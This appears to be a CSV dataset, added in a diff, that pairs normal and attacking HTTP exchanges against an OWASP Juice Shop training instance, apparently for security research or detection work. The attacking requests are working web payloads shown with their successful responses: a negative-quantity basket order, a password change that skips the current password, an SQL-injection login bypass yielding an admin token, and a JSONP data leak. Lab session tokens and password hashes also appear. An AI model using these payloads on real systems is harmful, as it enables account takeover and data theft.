@@ -1,0 +1,282 @@
+example,request_baseline,response_baseline,request_hacking,response_hacking
+1,"POST /api/BasketItems/
+cookie:_ga=GA1.1.1697365259.1702540335
+cookie:_fbp=fb.1.1702546897774.1047460064
+cookie:language=en
+cookie:welcomebanner_status=dismiss
+cookie:cookieconsent_status=dismiss
+cookie:_ga_M4RH33NR61=GS1.1.1702607904.5.1.1702607937.27.0.0
+cookie:continueCode=vje1O4ZaREB8Q3od1bH6u6TbfeiJfQH52sDQUJLs4qc73Gzkr6bl2VwPpXyJ
+cookie:token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJvQG8iLCJwYXNzd29yZCI6IjkxNzQxOGE4MzM5NmQzNWNjYTk4OGU5ZTBkODIzNTJhIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTEyLTMwIDEzOjQ0OjUxLjI0MCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIzLTEyLTMwIDE0OjM3OjAzLjA2NSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3MDM5NDcwNDEsImV4cCI6MTcwMzk2NTA0MX0.jZHJxArtSFv6YzJZsX6YvSi9MSRR3exQ_aW-7YrvDTuNh5Topk2DDTvobFAkcQObl2qfxp1uGBRJOXqpgokMujX2N8_j1QgyQonPIbXLU_LrLyrQ2PJ55CcpgKRi8Xs5Yx5qaa45AkMwD1oYgdJ9isNjwNEq4tax8eYK2BBglHU
+content-length:43
+sec-ch-ua:'Not_A Brand';v='8', 'Chromium';v='120'
+accept:application/json, text/plain, */*
+content-type:application/json
+sec-ch-ua-mobile:?0
+authorization:Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJvQG8iLCJwYXNzd29yZCI6IjkxNzQxOGE4MzM5NmQzNWNjYTk4OGU5ZTBkODIzNTJhIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTEyLTMwIDEzOjQ0OjUxLjI0MCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIzLTEyLTMwIDE0OjM3OjAzLjA2NSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3MDM5NDcwNDEsImV4cCI6MTcwMzk2NTA0MX0.jZHJxArtSFv6YzJZsX6YvSi9MSRR3exQ_aW-7YrvDTuNh5Topk2DDTvobFAkcQObl2qfxp1uGBRJOXqpgokMujX2N8_j1QgyQonPIbXLU_LrLyrQ2PJ55CcpgKRi8Xs5Yx5qaa45AkMwD1oYgdJ9isNjwNEq4tax8eYK2BBglHU
+user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+sec-ch-ua-platform:'Linux'
+origin:https://ca-008.training.cyberbay.tech
+sec-fetch-site:same-origin
+sec-fetch-mode:cors
+sec-fetch-dest:empty
+referer:https://ca-008.training.cyberbay.tech/
+accept-encoding:gzip, deflate, br
+accept-language:en-US,en;q=0.9
+priority:u=1, i
+
+{""ProductId"":6,""BasketId"":""6"",""quantity"":1}","HTTP/2.0 200 OK
+date:Sat, 30 Dec 2023 14:41:28 GMT
+content-type:application/json; charset=utf-8
+content-length:156
+access-control-allow-origin:*
+x-content-type-options:nosniff
+x-frame-options:SAMEORIGIN
+feature-policy:payment 'self'
+x-recruiting:/#/jobs
+etag:W/'9c-ORubFicIj0wSbO76lFGONs7YHTk'
+vary:Accept-Encoding
+decodeContent:
+
+{'status':'success','data':{'id':9,'ProductId':6,'BasketId':'6','quantity':1,'updatedAt':'2023-12-30T14:37:25.708Z','createdAt':'2023-12-30T14:37:25.708Z'}}","POST /api/BasketItems/
+cookie:_ga=GA1.1.1697365259.1702540335
+cookie:_fbp=fb.1.1702546897774.1047460064
+cookie:language=en
+cookie:welcomebanner_status=dismiss
+cookie:cookieconsent_status=dismiss
+cookie:_ga_M4RH33NR61=GS1.1.1702607904.5.1.1702607937.27.0.0
+cookie:continueCode=1PjrY4Ln3MolAoJHRuRTQfgixfXHgYt2jiNlUg6sDLulkhXj0wzg9aqWRZ5N
+cookie:token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJvQG8iLCJwYXNzd29yZCI6IjkxNzQxOGE4MzM5NmQzNWNjYTk4OGU5ZTBkODIzNTJhIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTEyLTMwIDEzOjQ0OjUxLjI0MCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIzLTEyLTMwIDE0OjM3OjAzLjA2NSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3MDQxOTMzNDEsImV4cCI6MTcwNDIxMTM0MX0.G2NMWraz2yKgJ6FuO-i5bfOv5GU5Ffg68yTU70JTVG-o7xHNPJQDrn4xbNtihBl9287LMNG2k0r55kyFtLRRKQb2-V6ZKuf9QshUxTc29Devrk7yt9ngMgYNOwo3kKe7rVcof2SizOeZXycZYWD2n-cpgmbzlGVbkv0Q2QABKx8
+content-length:48
+sec-ch-ua:'Not_A Brand';v='8', 'Chromium';v='120'
+accept:application/json, text/plain, */*
+content-type:application/json
+sec-ch-ua-mobile:?0
+authorization:Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJvQG8iLCJwYXNzd29yZCI6IjkxNzQxOGE4MzM5NmQzNWNjYTk4OGU5ZTBkODIzNTJhIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTEyLTMwIDEzOjQ0OjUxLjI0MCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIzLTEyLTMwIDE0OjM3OjAzLjA2NSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3MDQxOTMzNDEsImV4cCI6MTcwNDIxMTM0MX0.G2NMWraz2yKgJ6FuO-i5bfOv5GU5Ffg68yTU70JTVG-o7xHNPJQDrn4xbNtihBl9287LMNG2k0r55kyFtLRRKQb2-V6ZKuf9QshUxTc29Devrk7yt9ngMgYNOwo3kKe7rVcof2SizOeZXycZYWD2n-cpgmbzlGVbkv0Q2QABKx8
+user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+sec-ch-ua-platform:'Linux'
+origin:https://ca-008.training.cyberbay.tech
+sec-fetch-site:same-origin
+sec-fetch-mode:cors
+sec-fetch-dest:empty
+referer:https://ca-008.training.cyberbay.tech/
+accept-encoding:gzip, deflate, br
+accept-language:en-US,en;q=0.9
+priority:u=1, i
+
+{""ProductId"":33,""BasketId"":""6"",""quantity"":-1000}","HTTP/2.0 200 OK
+date:Tue, 02 Jan 2024 11:08:38 GMT
+content-type:application/json; charset=utf-8
+content-length:162
+access-control-allow-origin:*
+x-content-type-options:nosniff
+x-frame-options:SAMEORIGIN
+feature-policy:payment 'self'
+x-recruiting:/#/jobs
+etag:W/'a2-t3FffedWa2erylwIyF9KSwFsNZg'
+vary:Accept-Encoding
+decodeContent:
+
+{'status':'success','data':{'id':17,'ProductId':33,'BasketId':'6','quantity':-1000,'updatedAt':'2024-01-02T11:04:31.630Z','createdAt':'2024-01-02T11:04:31.630Z'}}"
+2,"GET /rest/user/change-password?current=qqqqq&new=qqqqq&repeat=qqqqq
+cookie:_ga=GA1.1.1697365259.1702540335
+cookie:_fbp=fb.1.1702546897774.1047460064
+cookie:language=en
+cookie:welcomebanner_status=dismiss
+cookie:cookieconsent_status=dismiss
+cookie:_ga_M4RH33NR61=GS1.1.1702607904.5.1.1702607937.27.0.0
+cookie:continueCode=qVhytnIjsZijH5ubTofnirf6SWH3ptOxi4XSg5SZ5UawCn9sB2i4YURPT2PIKZ
+cookie:token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MywidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImJlbmRlckBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMGMzNmU1MTdlM2ZhOTVhYWJmMWJiZmZjNjc0NGE0ZWYiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoidW5kZWZpbmVkIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMy0wNS0xMSAxMzoyMzowMy45MzcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNC0wMS0wOCAwNjo1OToyNC41MTIgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzA0Njk4MDQ2LCJleHAiOjE3MDQ3MTYwNDZ9.AEeBEWSpCBTPRcPdAej4mOCqFDVo-KEfCl9Y61eKCCDvaWjDSB-3hEPHTHNjPMddsAJfWXH0BRrmhP5OhDUMySYWJ7HzvL2A_afMO-5KXZL2CLSKzIl-Mm1GqIz4DHMSDTXzJTOIqBYHLNj0JEO0n9TQHwdLrf3TqT1-xE7pwC0
+sec-ch-ua:'Not_A Brand';v='8', 'Chromium';v='120'
+accept:application/json, text/plain, */*
+sec-ch-ua-mobile:?0
+authorization:Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MywidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImJlbmRlckBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMGMzNmU1MTdlM2ZhOTVhYWJmMWJiZmZjNjc0NGE0ZWYiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoidW5kZWZpbmVkIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMy0wNS0xMSAxMzoyMzowMy45MzcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNC0wMS0wOCAwNjo1OToyNC41MTIgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzA0Njk4MDQ2LCJleHAiOjE3MDQ3MTYwNDZ9.AEeBEWSpCBTPRcPdAej4mOCqFDVo-KEfCl9Y61eKCCDvaWjDSB-3hEPHTHNjPMddsAJfWXH0BRrmhP5OhDUMySYWJ7HzvL2A_afMO-5KXZL2CLSKzIl-Mm1GqIz4DHMSDTXzJTOIqBYHLNj0JEO0n9TQHwdLrf3TqT1-xE7pwC0
+user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+sec-ch-ua-platform:'Linux'
+sec-fetch-site:same-origin
+sec-fetch-mode:cors
+sec-fetch-dest:empty
+referer:https://ca-008.training.cyberbay.tech/
+accept-encoding:gzip, deflate, br
+accept-language:en-US,en;q=0.9
+priority:u=1, i","HTTP/2.0 401 Unauthorized
+date:Mon, 08 Jan 2024 07:21:00 GMT
+content-type:text/html; charset=utf-8
+content-length:32
+access-control-allow-origin:*
+x-content-type-options:nosniff
+x-frame-options:SAMEORIGIN
+feature-policy:payment 'self'
+x-recruiting:/#/jobs
+etag:W/'20-6tKKLCLLgOnzR5qInvJyo/E13vg'
+vary:Accept-Encoding
+decodeContent:
+
+Current password is not correct.","GET /rest/user/change-password?new=qqqqq&repeat=qqqqq
+cookie:_ga=GA1.1.1697365259.1702540335
+cookie:_fbp=fb.1.1702546897774.1047460064
+cookie:language=en
+cookie:welcomebanner_status=dismiss
+cookie:cookieconsent_status=dismiss
+cookie:_ga_M4RH33NR61=GS1.1.1702607904.5.1.1702607937.27.0.0
+cookie:continueCode=qVhytnIjsZijH5ubTofnirf6SWH3ptOxi4XSg5SZ5UawCn9sB2i4YURPT2PIKZ
+cookie:token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MywidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImJlbmRlckBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMGMzNmU1MTdlM2ZhOTVhYWJmMWJiZmZjNjc0NGE0ZWYiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoidW5kZWZpbmVkIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMy0wNS0xMSAxMzoyMzowMy45MzcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNC0wMS0wOCAwNjo1OToyNC41MTIgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzA0Njk4MDQ2LCJleHAiOjE3MDQ3MTYwNDZ9.AEeBEWSpCBTPRcPdAej4mOCqFDVo-KEfCl9Y61eKCCDvaWjDSB-3hEPHTHNjPMddsAJfWXH0BRrmhP5OhDUMySYWJ7HzvL2A_afMO-5KXZL2CLSKzIl-Mm1GqIz4DHMSDTXzJTOIqBYHLNj0JEO0n9TQHwdLrf3TqT1-xE7pwC0
+sec-ch-ua:'Not_A Brand';v='8', 'Chromium';v='120'
+accept:application/json, text/plain, */*
+sec-ch-ua-mobile:?0
+authorization:Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MywidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImJlbmRlckBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMGMzNmU1MTdlM2ZhOTVhYWJmMWJiZmZjNjc0NGE0ZWYiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoidW5kZWZpbmVkIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMy0wNS0xMSAxMzoyMzowMy45MzcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNC0wMS0wOCAwNjo1OToyNC41MTIgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzA0Njk4MDQ2LCJleHAiOjE3MDQ3MTYwNDZ9.AEeBEWSpCBTPRcPdAej4mOCqFDVo-KEfCl9Y61eKCCDvaWjDSB-3hEPHTHNjPMddsAJfWXH0BRrmhP5OhDUMySYWJ7HzvL2A_afMO-5KXZL2CLSKzIl-Mm1GqIz4DHMSDTXzJTOIqBYHLNj0JEO0n9TQHwdLrf3TqT1-xE7pwC0
+user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+sec-ch-ua-platform:'Linux'
+sec-fetch-site:same-origin
+sec-fetch-mode:cors
+sec-fetch-dest:empty
+referer:https://ca-008.training.cyberbay.tech/
+accept-encoding:gzip, deflate, br
+accept-language:en-US,en;q=0.9
+priority:u=1, i","HTTP/2.0 200 OK
+date:Mon, 08 Jan 2024 07:21:45 GMT
+content-type:application/json; charset=utf-8
+content-length:352
+access-control-allow-origin:*
+x-content-type-options:nosniff
+x-frame-options:SAMEORIGIN
+feature-policy:payment 'self'
+x-recruiting:/#/jobs
+etag:W/'160-LBrWsWzJ0eVM9WIScB+uFDqu3mQ'
+vary:Accept-Encoding
+decodeContent:
+
+{'user':{'id':3,'username':'','email':'bender@juice-sh.op','password':'437599f1ea3514f8969f161a6606ce18','role':'customer','deluxeToken':'','lastLoginIp':'undefined','profileImage':'assets/public/images/uploads/default.svg','totpSecret':'','isActive':true,'createdAt':'2023-05-11T13:23:03.937Z','updatedAt':'2024-01-08T07:17:27.190Z','deletedAt':null}}"
+3,"POST /rest/user/login
+cookie:_ga=GA1.1.1697365259.1702540335
+cookie:_fbp=fb.1.1702546897774.1047460064
+cookie:language=en
+cookie:welcomebanner_status=dismiss
+cookie:cookieconsent_status=dismiss
+cookie:_ga_M4RH33NR61=GS1.1.1702602648.4.1.1702603953.54.0.0
+content-length:34
+sec-ch-ua:'Chromium';v='119', 'Not?A_Brand';v='24'
+accept:application/json, text/plain, */*
+content-type:application/json
+sec-ch-ua-mobile:?0
+user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
+sec-ch-ua-platform:'Linux'
+origin:https://ca-008.training.cyberbay.tech
+sec-fetch-site:same-origin
+sec-fetch-mode:cors
+sec-fetch-dest:empty
+referer:https://ca-008.training.cyberbay.tech/
+accept-encoding:gzip, deflate, br
+accept-language:en-US,en;q=0.9
+priority:u=1, i
+
+{""email"":""limit"",""password"":""vvv""}","HTTP/2.0 401 Unauthorized
+date:Fri, 15 Dec 2023 01:35:14 GMT
+content-type:text/html; charset=utf-8
+content-length:26
+access-control-allow-origin:*
+x-content-type-options:nosniff
+x-frame-options:SAMEORIGIN
+feature-policy:payment 'self'
+x-recruiting:/#/jobs
+etag:W/'1a-ARJvVK+smzAF3QQve2mDSG+3Eus'
+vary:Accept-Encoding
+decodeContent:
+
+Invalid email or password.","POST /rest/user/login
+cookie:_ga=GA1.1.1697365259.1702540335
+cookie:_fbp=fb.1.1702546897774.1047460064
+cookie:language=en
+cookie:welcomebanner_status=dismiss
+cookie:cookieconsent_status=dismiss
+cookie:_ga_M4RH33NR61=GS1.1.1702602648.4.1.1702603953.54.0.0
+content-length:42
+sec-ch-ua:'Chromium';v='119', 'Not?A_Brand';v='24'
+accept:application/json, text/plain, */*
+content-type:application/json
+sec-ch-ua-mobile:?0
+user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
+sec-ch-ua-platform:'Linux'
+origin:https://ca-008.training.cyberbay.tech
+sec-fetch-site:same-origin
+sec-fetch-mode:cors
+sec-fetch-dest:empty
+referer:https://ca-008.training.cyberbay.tech/
+accept-encoding:gzip, deflate, br
+accept-language:en-US,en;q=0.9
+priority:u=1, i
+
+{""email"":""hi\\' or 1=1 --"",""password"":""vvv""}","HTTP/2.0 200 OK
+date:Fri, 15 Dec 2023 01:35:01 GMT
+content-type:application/json; charset=utf-8
+content-length:834
+access-control-allow-origin:*
+x-content-type-options:nosniff
+x-frame-options:SAMEORIGIN
+feature-policy:payment 'self'
+x-recruiting:/#/jobs
+etag:W/'342-1WIAy2rGZ+kWo4WHa2KuSqRiDV4'
+vary:Accept-Encoding
+decodeContent:
+
+{'authentication':{'token':'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDUtMTEgMTM6MjM6MDMuOTM2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDUtMTIgMDc6MTY6MDcuODUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTcwMjYwMzg2OCwiZXhwIjoxNzAyNjIxODY4fQ.QpP5dzSvjid4mlrGarZfYXQt_hdpBD2igmLCVDwRb4iJSl4bHp5AC3h6r6N5M720iBAihAuYLax4Z9pFG7ADUf7d2dP-abELQloryxV0DhJLOXKPV1rJuT8JvpTI8hw2pCo1JmdrpOVceyzStcaKhIs235biBUlAo70moTlcEio','bid':1,'umail':'admin@juice-sh.op'}}"
+4,"GET /rest/user/whoami
+cookie:_ga=GA1.1.1697365259.1702540335
+cookie:_fbp=fb.1.1702546897774.1047460064
+cookie:_ga_M4RH33NR61=GS1.1.1702561545.3.1.1702563826.60.0.0
+cookie:language=en
+cookie:welcomebanner_status=dismiss
+sec-ch-ua:'Chromium';v='119', 'Not?A_Brand';v='24'
+accept:application/json, text/plain, */*
+sec-ch-ua-mobile:?0
+user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
+sec-ch-ua-platform:'Linux'
+sec-fetch-site:same-origin
+sec-fetch-mode:cors
+sec-fetch-dest:empty
+referer:https://ca-008.training.cyberbay.tech/
+accept-encoding:gzip, deflate, br
+accept-language:en-US,en;q=0.9
+priority:u=1, i","HTTP/2.0 200 OK
+date:Thu, 14 Dec 2023 14:27:09 GMT
+content-type:application/json; charset=utf-8
+content-length:11
+access-control-allow-origin:*
+x-content-type-options:nosniff
+x-frame-options:SAMEORIGIN
+feature-policy:payment 'self'
+x-recruiting:/#/jobs
+etag:W/'b-/5bSboVjVhGw3qRgvUfZjE1r1Ns'
+vary:Accept-Encoding
+decodeContent:
+
+{'user':{}}","GET /rest/user/whoami?callback=admin
+cookie:language=en
+cookie:welcomebanner_status=dismiss
+cookie:cookieconsent_status=dismiss
+cookie:token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoicXFxcXFxcXFxcXFxIiwiZW1haWwiOiJvQG8iLCJwYXNzd29yZCI6IjkxNzQxOGE4MzM5NmQzNWNjYTk4OGU5ZTBkODIzNTJhIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTEyLTMwIDEzOjQ0OjUxLjI0MCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI0LTAxLTExIDEyOjQ3OjMwLjI2NyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3MDUzODQ2NjcsImV4cCI6MTcwNTQwMjY2N30.hhRfA6uANGA_I8FhbTLeRAt37NUrXtSkJPKHK8-GatSvYiB9YCB8l9opvfO9dMSGX4HwkQ_DMJZGbGnmg3mBQlYVlS6jocy3o22glxrnv8EsUfmMdONyL2jSDQe7i6VZsEbViaDAHWxw7qk-m5SfsQZtiYJjMHYUVxKFndZJeYo
+sec-ch-ua:'Not_A Brand';v='8', 'Chromium';v='120'
+accept:application/json, text/plain, */*
+sec-ch-ua-mobile:?0
+user-agent:Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+sec-ch-ua-platform:'Linux'
+sec-fetch-site:same-origin
+sec-fetch-mode:cors
+sec-fetch-dest:empty
+referer:https://ca-008.training.cyberbay.tech/
+accept-encoding:gzip, deflate, br
+accept-language:en-US,en;q=0.9
+priority:u=1, i","HTTP/2.0 200 OK
+date:Tue, 16 Jan 2024 06:08:33 GMT
+content-type:text/javascript; charset=utf-8
+content-length:161
+access-control-allow-origin:*
+x-content-type-options:nosniff
+x-frame-options:SAMEORIGIN
+feature-policy:payment 'self'
+x-recruiting:/#/jobs
+etag:W/'a1-osBXRdm1tsVwVLSc4CA+gqDVFoY'
+vary:Accept-Encoding
+decodeContent:
+
+/**/ typeof admin === \\'function\\' && admin({'user':{'id':21,'email':'o@o','lastLoginIp':'undefined','profileImage':'/assets/public/images/uploads/default.svg'}});"
